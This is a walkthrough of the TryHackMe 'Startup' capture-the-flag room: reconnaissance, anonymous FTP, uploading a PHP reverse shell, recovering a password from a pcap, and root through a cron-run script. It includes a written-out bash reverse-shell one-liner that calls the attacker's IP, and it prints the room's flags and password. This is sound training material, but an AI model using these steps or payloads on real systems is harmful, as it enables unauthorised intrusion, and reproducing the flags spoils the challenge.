# Startup

<div align="left">

<figure><img src=".gitbook/assets/spaces_EhofjMfYbx3gOUSReXD7_uploads_git-blob-09d7b5dbac78c58c7b74721476ee6617c8b73086_startup (1).png" alt=""><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

🔗 [Startup](https://tryhackme.com/room/startup)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.196.181`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.196.181 startup.thm" >> /etc/hosts

mkdir thm/startup.thm
cd thm/startup.thm
mkdir {nmap,content,exploits,scripts}

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 startup.thm
PING startup.thm (10.10.196.181) 56(84) bytes of data.
64 bytes from startup.thm (10.10.196.181): icmp_seq=1 ttl=63 time=66.4 ms
64 bytes from startup.thm (10.10.196.181): icmp_seq=2 ttl=63 time=63.9 ms
64 bytes from startup.thm (10.10.196.181): icmp_seq=3 ttl=63 time=63.4 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix, while Windows systems usually have a TTL of 128 secs.

### 2.1 - What is the secret spicy soup recipe?

Of course, start to check information scanning open ports:

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 startup.thm -oG nmap/port_scan
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 17:18 EDT
Initiating SYN Stealth Scan at 17:18
Scanning startup.thm (10.10.196.181) [65536 ports]
Discovered open port 22/tcp on 10.10.196.181
Discovered open port 21/tcp on 10.10.196.181
Discovered open port 80/tcp on 10.10.196.181
Completed SYN Stealth Scan at 17:18, 13.25s elapsed (65536 total ports)
Nmap scan report for startup.thm (10.10.196.181)
Host is up, received user-set (0.075s latency).
Scanned at 2023-07-29 17:18:18 EDT for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 2 open ports on the machine: 21, 22, 80.

Now, we need to search which services are running on open ports:

```bash
nmap -p21,80 -n -Pn -vvv -sCV --min-rate 5000 startup.thm -oN nmap/open_port
```

```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.80.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Unix
```

We see that port 21 has anonymous login allowed with accessible files, jump in and get files!

<figure><img src=".gitbook/assets/Schermata del 2023-07-29 23-25-35.png" alt=""><figcaption></figcaption></figure>

```
cat notice.txt
```

_Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus._

That's a pretty info, Maya can be an username!

<figure><img src=".gitbook/assets/Schermata del 2023-07-29 23-31-09.png" alt=""><figcaption><p>important.jpg</p></figcaption></figure>

Using gobuster we try to find hidden path

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-31-10.png" alt=""><figcaption></figcaption></figure>

The best solution is to create a .php reverse shell and put in ftp folder via FTP

We copy php-reverse-shell.php just ready from php webshells folder

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

and custom it using our IP and Port:

```bash
ano php-reverse-shell.php
```

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-51-58.png" alt=""><figcaption></figcaption></figure>

Rename it:

```bash
mv php-reverse-shell.php shell.php
```

and put in ftp folder via FTP:

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-54-53.png" alt=""><figcaption></figcaption></figure>

and start netcat on the same reverse shell port (444):

```bash
nc -lvnp 444
```

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-03-57.png" alt=""><figcaption></figcaption></figure>

Now, we're in! Check flags here..

<div align="left">

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-09-08.png" alt=""><figcaption></figcaption></figure>

</div>

We see an interesting file "recipe.txt", and we find information that we need!

```bash
cat recipe.txt
```

_Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love._

{% hint style="info" %}
love
{% endhint %}

### Task 3 - What are the contents of user.txt?

We quickly try to find user.txt flag using find command:\


```bash
find / -type f -iname user.txt 2>/dev/null
```

but we don't find anything! Then we need to explore files or escalate privileges

We notes an interesting dir called: incidents, with suspicious.pcapng (wireshark ext), we try to get it, but permission is denied!

Then, we can use netcat to open a new connection and transfer it:

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-25-20.png" alt=""><figcaption></figcaption></figure>

We can analyze susp.pcap file using wireshark or strings:

```bash
strings susp.pcap
```

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-33-24.png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-37-44 (1).png" alt=""><figcaption></figcaption></figure>

We see this psw: c4ntg3t3n0ughsp1c3 we can try to use it!

```bash
ssh lennie@startup.thm
```

```bash
lennie@startup.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

44 packages can be updated.
30 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ ls
Documents  scripts  user.txt
$ cat user.txt
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

</details>

### Task 4 - What are the contents of root.txt?

We can continue to explore files:

```bash
ls -lah *
    -rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
    
    Documents:
    total 20K
    drwxr-xr-x 2 lennie lennie 4.0K Nov 12  2020 .
    drwx------ 5 lennie lennie 4.0K May 15 13:37 ..
    -rw-r--r-- 1 root   root    139 Nov 12  2020 concern.txt
    -rw-r--r-- 1 root   root     47 Nov 12  2020 list.txt
    -rw-r--r-- 1 root   root    101 Nov 12  2020 note.txt
    
    scripts:
    total 16K
    drwxr-xr-x 2 root   root   4.0K Nov 12  2020 .
    drwx------ 5 lennie lennie 4.0K May 15 13:37 ..
    -rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
    -rw-r--r-- 1 root   root      1 May 15 13:38 startup_list.txt

cat scripts/*
cat Documents/*
cat /etc/print.sh
ls -lah /etc/print.sh
	-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

We see that planner.sh will be run as root (with a cron job), and use /etc/print.sh with lennie permission, we can modify it inserting a reverse shell as payload:

```bash
echo "/bin/bash -i >& /dev/tcp/10.9.80.228/666 0>&1" >> /etc/print.sh                                                     
```

Then, we run on our kali machine netcat on the same port (666):

```bash
nc -nvlp 666
```

and wait root that will run the planner.sh script once a minute.

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 12-37-21.png" alt=""><figcaption></figcaption></figure>

Well done! We find root flag:

```bash
ls
cat root.txt
```

<div align="left">

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 12-38-55.png" alt=""><figcaption></figcaption></figure>

</div>

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

THM{f963aaa6a430f210222158ae15c3d76d}

</details>
